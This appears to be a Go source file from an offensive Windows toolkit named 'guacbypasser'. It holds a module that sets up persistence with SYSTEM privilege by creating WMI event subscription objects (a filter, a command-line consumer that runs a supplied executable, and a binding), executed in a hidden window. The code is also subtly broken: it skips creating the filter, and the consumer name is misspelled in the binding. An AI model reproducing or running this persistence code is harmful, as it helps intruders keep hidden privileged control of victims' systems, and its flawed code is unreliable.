package guacbypasser

import (
	"fmt"
	"syscall"
	"time"
)

func pWmic(path string) error {
	_ = Reporter{
		Name: "WMIC",
		Desc: "Gain persistence with system privilege using wmic",
		Id:   12,

		Type:   "Persistence",
		Module: "p_wmic",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	commands := []string{
		"wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='GuacBypassFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",
		fmt.Sprintf("wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='GuacBypassConsumer', ExecutablePath='%s',CommandLineTemplate='%s'", path, path),
		"wmic /namespace:'\\\\root\\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name='GuacBypassFilter'', Consumer='CommandLineEventConsumer.Name='GuacBypassConsomer'')",
	}
	for index, command := range commands {
		if index == 0 {
			continue
		} else {
			time.Sleep(3 * time.Second)
		}
		cmd := newCmd(command)
		cmd.exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if _, err := cmd.exec.Output(); err != nil {
			return err
		}
	}
	return nil
}
